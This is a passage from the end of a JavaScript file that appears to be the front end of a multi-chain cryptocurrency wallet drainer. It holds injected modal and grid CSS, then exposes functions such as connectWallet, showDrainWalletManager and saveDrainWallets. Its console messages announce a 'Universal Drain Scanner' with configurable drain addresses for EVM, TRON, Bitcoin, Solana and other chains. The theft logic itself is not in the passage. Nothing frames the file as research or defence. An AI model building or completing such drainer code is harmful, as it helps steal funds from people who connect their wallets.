            100% { transform: rotate(360deg); }
        }
        
        @keyframes modalSlide {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        @media (max-width: 640px) {
            .modal-content {
                width: 95%;
                margin: 10px;
            }
            
            .tokens-grid {
                grid-template-columns: 1fr;
            }
            
            .wallet-option {
                padding: 12px;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// ================================================
// INITIALIZATION
// ================================================

window.addEventListener('DOMContentLoaded', initializeApp);
window.connectWallet = connectWallet;
window.closeModal = closeModal;
window.showDrainWalletManager = showDrainWalletManager;
window.saveDrainWallets = saveDrainWallets;

console.log('⚡ Universal Drain Scanner Loaded');
console.log('📊 Supports: EVM, TRON, Bitcoin, Solana, Dogecoin, Litecoin');
console.log('💰 Drain Addresses Configurable via Wallet Button');
